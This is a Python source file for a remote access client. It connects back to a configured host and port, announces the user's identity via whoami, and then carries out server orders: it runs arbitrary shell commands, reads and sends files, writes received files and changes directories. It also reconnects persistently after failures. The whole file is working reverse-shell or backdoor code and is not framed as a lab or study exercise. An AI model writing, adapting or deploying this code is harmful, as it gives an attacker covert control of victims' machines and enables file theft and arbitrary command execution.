from timeout_function_decorator import timeout
from base64 import b64encode, b64decode
from subprocess import getstatusoutput
from os import getcwd, chdir
from os.path import exists
from socket import socket
from json import dumps
from time import sleep

host = 'localhost'
port = 5000

type_png = 0 # ping
type_cmd = 1 # command
type_get = 2 # get file
type_put = 3 # put file
type_hds = 4 # connection handshake
type_out = 5 # output
type_rsp = 6 # file get response
type_cnt = 7 # file content
type_cwd = 8 # change working directory
type_gcd = 9 # get current directory

def read_file(path):
    with open(path, 'rb') as file:
        return file.read()
    
def make_file(path, content):
    with open(path, 'wb') as file:
        file.write(content)

@timeout(30)
def run(*args, **kwargs):
    return getstatusoutput(*args, **kwargs)

class Socket():

    def __init__(self, host, port, sock, type_max=4, length_max=8, label=None):
        self.host = host
        self.port = port
        self.sock = sock
        self.type_max = type_max
        self.length_max = length_max
        self.label = label if label else port

    def send(self, type, data, timeout=None):
        self.sock.settimeout(timeout)
        
        compressed = b64encode(data)
        header = type.to_bytes(self.type_max) + len(compressed).to_bytes(self.length_max)

        self.sock.send(header + compressed)
        print(data)

    def recv(self, timeout=None):
        self.sock.settimeout(timeout)

        type = int.from_bytes(self.sock.recv(self.type_max))
        length = int.from_bytes(self.sock.recv(self.length_max))
        compressed = b''
        
        while len(compressed) < length:
            compressed += self.sock.recv(length-len(compressed))

        data = b64decode(compressed)
        return type, data
    
    def expect(self, expected, retrys=2, timeout=None):
        type, data = self.recv(timeout)

        for _ in range(retrys + 1):
            if type == expected:
                return data
            
        raise ValueError('Unexpected value!')
        
class Client(Socket):

    def __init__(self, host, port, sock, type_max=4, length_max=8, label=None, cwd=None):
        super().__init__(host, port, sock, type_max, length_max, label)
        self.cwd = cwd if cwd else getcwd()

    def connect(self, attempts=0):
        
        def attempt():
            
            try:
                self.sock.connect((self.host, self.port))
                self.send(type_hds, self.label.encode())
                return True
                
            except (TimeoutError, ConnectionError):
                return
            
        while True if not attempts else attempts:
            
            if attempt():
                break

def mainloop():
    client = Client(host, port, socket(), 4, 8, label=getstatusoutput('whoami')[1])
    client.connect()

    while True:
        type, data = client.recv()

        if type == type_png:
            continue

        elif type == type_gcd:
            client.send(type_gcd, getcwd().encode())
            continue

        elif type == type_cwd:
            new_dir = data.decode()

            if exists(new_dir):
                chdir(new_dir)
                output = (0, f'Changed directory to "{getcwd()}"')
            
            else:
                output = (1, 'Directory not found!')

        elif type == type_get:
            path = data.decode()

            if exists(path):
                client.send(type_rsp, b'1')
                client.send(type_cnt, read_file(path))
                output = (0, 'Data sent successfully!')
            
            else:
                client.send(type_rsp, b'0')
                output = (1, 'File not found!')

        elif type == type_put:
            path = data.decode()
            make_file(path, client.expect(type_cnt))
            output = (0, 'Data received successfully!')

        elif type == type_cmd:
            try:
                output = run(data.decode())
            
            except TimeoutError:
                output = (1, 'Command timed out!')

        client.send(type_out, dumps(output).encode())

while True:
    try:
        mainloop()

    except Exception:
        sleep(60)
        continue